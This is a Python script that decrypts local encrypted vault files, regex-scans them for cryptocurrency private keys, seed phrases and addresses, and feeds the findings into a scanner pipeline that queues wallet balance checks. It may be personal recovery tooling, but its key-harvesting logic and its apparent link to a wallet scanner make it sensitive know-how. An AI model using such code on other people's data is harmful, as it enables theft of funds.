#!/usr/bin/env python3
"""
Auto-decrypt — decrypts encrypted vault files and feeds findings into the scanner pipeline.

Runs automatically via dashgo on startup.  Uses encrypt_offload.py's decrypt
functions to unwrap .enc files, then scans the plaintext for wallet material
(private keys, seed phrases, addresses) and feeds them into the same pipeline
that crypto_scanner uses.

Usage:
    python3 ~/auto_decrypt.py                    # decrypt + scan + feed pipeline
    python3 ~/auto_decrypt.py --dry-run          # decrypt only, report findings
    python3 ~/auto_decrypt.py --email            # also email summary
    python3 ~/auto_decrypt.py --no-scan          # decrypt only, skip pipeline feed
"""
from __future__ import annotations

import argparse
import json
import os
import re
import sys
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Dict, List, Optional

HOME = Path(os.path.expanduser("~"))
sys.path.insert(0, str(HOME))

import encrypt_offload as eo

# ── ANSI ────────────────────────────────────────────────────────────
BOLD = "\033[1m"
DIM = "\033[2m"
RST = "\033[0m"
GREEN = "\033[92m"
GOLD = "\033[38;5;220m"
CYAN = "\033[96m"
RED = "\033[91m"
OK = f"{GREEN}✓{RST}"
ERR = f"{RED}✗{RST}"

# ── Wallet patterns (same as android_wallet_scanner) ────────────────
RE_HEX_KEY = re.compile(r'\b([0-9a-fA-F]{64})\b')
RE_WIF = re.compile(r'\b([5KL][1-9A-HJ-NP-Za-km-z]{50,51})\b')
RE_ETH_ADDR = re.compile(r'\b(0x[0-9a-fA-F]{40})\b')
RE_BTC_ADDR = re.compile(r'\b([13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-zA-HJ-NP-Z0-9]{25,62})\b')
RE_SOL_KEY = re.compile(r'\b([1-9A-HJ-NP-Za-km-z]{87,88})\b')
RE_SEED = re.compile(r'\b([a-z]{2,8}(?:\s+[a-z]{2,8}){11,23})\b', re.IGNORECASE)  # rough 12-24 word sequence

# BIP39 words (subset for fast check)
_BIP39 = {
    "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract",
    "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid",
    "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual",
    "adapt", "add", "addict", "address", "adjust", "admit", "adult", "advance",
    "advice", "aerobic", "affair", "afford", "afraid", "africa", "after", "again",
    "age", "agent", "agree", "ahead", "aim", "air", "airport", "aisle", "alarm",
    "album", "alcohol", "alert", "alien", "all", "alley", "allow", "almost", "alone",
    "alpha", "already", "also", "alter", "always", "amateur", "amazing", "among",
    "amount", "amused", "analyst", "anchor", "ancient", "anger", "angle", "angry",
    "animal", "ankle", "announce", "annual", "another", "answer", "antenna",
    "antique", "anxiety", "any", "apart", "apology", "appear", "apple", "approve",
    "april", "arch", "arctic", "area", "arena", "argue", "arm", "armed", "armor",
    "army", "around", "arrange", "arrest", "arrive", "arrow", "art", "artefact",
    "artist", "artwork", "ask", "aspect", "assault", "asset", "assist", "assume",
    "asthma", "athlete", "atom", "attack", "attend", "attitude", "attract",
    "auction", "audit", "august", "aunt", "author", "auto", "autumn", "average",
    "avocado", "avoid", "awake", "aware", "away", "awesome", "awful", "awkward",
    "axis", "baby", "bachelor", "bacon", "badge", "bag", "balance", "balcony",
    "ball", "bamboo", "banana", "banner", "bar", "barely", "bargain", "barrel",
    "base", "basic", "basket", "battle", "beach", "bean", "beauty", "because",
    "become", "beef", "before", "begin", "behave", "behind", "believe", "below",
    "belt", "bench", "benefit", "best", "betray", "better", "between", "beyond",
    "bicycle", "bid", "bike", "bind", "biology", "bird", "birth", "bitter", "black",
    "blade", "blame", "blanket", "blast", "bleak", "bless", "blind", "blood",
    "blossom", "blouse", "blue", "blur", "blush", "board", "boat", "body", "boil",
    "bomb", "bone", "bonus", "book", "boost", "border", "boring", "borrow", "boss",
    "bottom", "bounce", "box", "boy", "bracket", "brain", "brand", "brass", "brave",
    "bread", "breeze", "brick", "bridge", "brief", "bright", "bring", "brisk",
    "broccoli", "broken", "bronze", "broom", "brother", "brown", "brush", "bubble",
    "buddy", "budget", "buffalo", "build", "bulb", "bulk", "bullet", "bundle",
    "bunker", "burden", "burger", "burst", "bus", "business", "busy", "butter",
    "buyer", "buzz",
}


def _is_junk_hex(hk: str) -> bool:
    h = hk.lower()
    if h in ("0" * 64, "f" * 64):
        return True
    if len(set(h)) <= 4:
        return True
    if h.count("0") > 48:
        return True
    return False


def extract_wallet_content(text: str) -> dict:
    """Extract crypto material from decrypted plaintext."""
    findings: dict = {
        "wallet": {"wifs": [], "hex_keys": [], "seed_phrases": []},
        "derived_addresses": [],
    }

    # HEX keys
    hex_keys = []
    for m in RE_HEX_KEY.finditer(text):
        hk = m.group(1)
        if not _is_junk_hex(hk):
            hex_keys.append(hk)
    findings["wallet"]["hex_keys"] = list(dict.fromkeys(hex_keys))

    # WIF keys
    wifs = []
    for m in RE_WIF.finditer(text):
        w = m.group(1)
        if 50 <= len(w) <= 52:
            wifs.append(w)
    findings["wallet"]["wifs"] = list(dict.fromkeys(wifs))

    # Seed phrases (BIP39 wordlist check)
    seeds = []
    for m in RE_SEED.finditer(text):
        phrase = m.group(1).strip()
        words = phrase.lower().split()
        if len(words) in (12, 24):
            bip39_count = sum(1 for w in words if w in _BIP39)
            if bip39_count >= len(words) * 0.85:  # 85% BIP39 match
                seeds.append(" ".join(words))
    findings["wallet"]["seed_phrases"] = list(dict.fromkeys(seeds))

    # ETH addresses (cap per file)
    addrs = list(dict.fromkeys(m.group(1) for m in RE_ETH_ADDR.finditer(text)))
    for addr in addrs[:30]:
        findings["derived_addresses"].append(
            {"chain": "eth", "address": addr, "from": "auto_decrypt"}
        )

    # BTC addresses
    btc_addrs = list(dict.fromkeys(m.group(1) for m in RE_BTC_ADDR.finditer(text)))
    for addr in btc_addrs[:10]:
        findings["derived_addresses"].append(
            {"chain": "btc", "address": addr, "from": "auto_decrypt"}
        )

    # Solana keys
    sol_keys = list(dict.fromkeys(m.group(1) for m in RE_SOL_KEY.finditer(text)))
    for addr in sol_keys[:5]:
        findings["derived_addresses"].append(
            {"chain": "sol", "address": addr, "from": "auto_decrypt"}
        )

    if not (hex_keys or wifs or seeds):
        return {}
    findings["confidence"] = "high"
    return findings


def decrypt_and_scan(dry_run: bool = False, no_scan: bool = False) -> tuple:
    """Decrypt all .enc files, scan content, feed pipeline.
    Returns (decrypted_count, wallets_found, findings_list)."""
    passphrase = eo.get_passphrase(None, allow_generate=False)
    if not passphrase:
        print(f"  {ERR} No passphrase found — set ~/.encrypt_passphrase or ENCRYPT_PASSPHRASE env")
        return 0, 0, []

    # Find .enc files
    enc_files = []
    for d in (eo.VAULT_DIR, HOME):
        if not d.exists():
            continue
        for p in d.glob("*.enc"):
            if p not in enc_files:
                enc_files.append(p)

    if not enc_files:
        print(f"  {DIM}No .enc files found — vault is empty.{RST}")
        return 0, 0, []

    decrypted = 0
    all_findings = []
    now_ts = datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")

    for enc_path in enc_files:
        orig_name = enc_path.name[:-4]  # strip .enc
        out_path = HOME / f".decrypted_{orig_name}"

        print(f"  {CYAN}🔓{RST} {enc_path.name} ({enc_path.stat().st_size:,} bytes) ... ", end="", flush=True)

        if dry_run:
            print(f"{GOLD}dry-run{RST}")
            decrypted += 1
            continue

        if not eo.decrypt_one(enc_path, out_path, passphrase):
            print(f"{ERR} decrypt failed")
            continue

        print(f"{OK}")

        # Scan decrypted content
        try:
            text = out_path.read_text(encoding="utf-8", errors="ignore")
        except Exception:
            try:
                out_path.unlink()
            except Exception:
                pass
            continue

        findings = extract_wallet_content(text)
        n_keys = (len(findings.get("wallet", {}).get("hex_keys", []))
                  + len(findings.get("wallet", {}).get("wifs", []))
                  + len(findings.get("wallet", {}).get("seed_phrases", [])))

        if n_keys > 0:
            print(f"    {GOLD}{n_keys}{RST} keys extracted from {orig_name}")
            all_findings.append({
                "file": orig_name,
                "enc_file": str(enc_path),
                "findings": findings,
            })
        else:
            print(f"    {DIM}no wallet material found{RST}")

        decrypted += 1

        # Clean up decrypted temp file (or keep for pipeline)
        if no_scan:
            try:
                out_path.unlink()
            except Exception:
                pass

    # Feed pipeline
    if all_findings and not dry_run and not no_scan:
        written = _feed_pipeline(all_findings, now_ts)
        print(f"\n  {GREEN}{written}{RST} records written to scanner memory")
    else:
        written = 0

    return decrypted, len(all_findings), all_findings


def _feed_pipeline(findings: List[dict], now_ts: str) -> int:
    """Write findings to crypto_scanner_memory.jsonl."""
    memory_file = HOME / "crypto_scanner_memory.jsonl"
    written = 0
    for f in findings:
        rec = {
            "findings": f["findings"],
            "source": "auto_decrypt",
            "source_uri": f"file://{f['enc_file']}",
            "timestamp": now_ts,
        }
        try:
            with open(memory_file, "a", encoding="utf-8") as fh:
                fh.write(json.dumps(rec) + "\n")
            written += 1
        except OSError:
            pass

    # Trigger balance check
    if written > 0:
        try:
            import crypto_scanner as cs
            addr_map: Dict[str, List[str]] = {}
            for f in findings:
                for d in f["findings"].get("derived_addresses", []):
                    addr_map.setdefault(d.get("chain", "eth"), []).append(d.get("address", ""))
            if addr_map:
                cs.queue_balances(addr_map)
        except Exception:
            pass

    return written


def email_results(findings: List[dict], decrypted: int) -> None:
    """Send auto-decrypt summary via email."""
    try:
        from daily_funded_report import smtp_creds, send_email
        creds = smtp_creds()
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        body_lines = [
            "=" * 60,
            "AUTO-DECRYPT RESULTS",
            f"Time: {now}",
            f"Files decrypted: {decrypted}",
            f"Files with keys: {len(findings)}",
            "=" * 60,
            "",
        ]
        total_keys = 0
        for f in findings[:30]:
            w = f["findings"]["wallet"]
            n = len(w["hex_keys"]) + len(w["wifs"]) + len(w["seed_phrases"])
            total_keys += n
            body_lines.append(f"FILE: {f['file']}")
            if w["hex_keys"]:
                body_lines.append(f"  HEX: {len(w['hex_keys'])}")
            if w["wifs"]:
                body_lines.append(f"  WIF: {len(w['wifs'])}")
            if w["seed_phrases"]:
                body_lines.append(f"  SEED: {len(w['seed_phrases'])}")
            body_lines.append("")
        body_lines.append(f"Total keys extracted: {total_keys}")
        body = "\n".join(body_lines)
        send_email(
            creds,
            subject=f"[AUTO-DECRYPT] {decrypted} vault files processed · {total_keys} keys · {now}",
            body=body,
        )
        print(f"  {OK} Email sent")
    except Exception as exc:
        print(f"  {ERR} Email: {exc}")


def main():
    ap = argparse.ArgumentParser(description="Auto-decrypt vault files and feed scanner pipeline")
    ap.add_argument("--dry-run", action="store_true", help="list .enc files only, don't decrypt")
    ap.add_argument("--email", action="store_true", help="email summary after decrypt")
    ap.add_argument("--no-scan", action="store_true", help="decrypt only, don't scan or feed pipeline")
    args = ap.parse_args()

    print(f"\n{BOLD}AUTO-DECRYPT{RST}  {DIM}vault → scanner pipeline{RST}\n")

    t0 = time.time()
    decrypted, wallets, findings = decrypt_and_scan(
        dry_run=args.dry_run, no_scan=args.no_scan,
    )
    elapsed = time.time() - t0

    print(f"\n{'─' * 50}")
    print(f"  Decrypted: {decrypted} files")
    print(f"  Wallets:   {wallets} files with keys")
    print(f"  Time:      {elapsed:.1f}s")
    if args.dry_run:
        print(f"  {GOLD}DRY RUN — nothing changed{RST}")
    print()

    if args.email and not args.dry_run and findings:
        email_results(findings, decrypted)


if __name__ == "__main__":
    main()
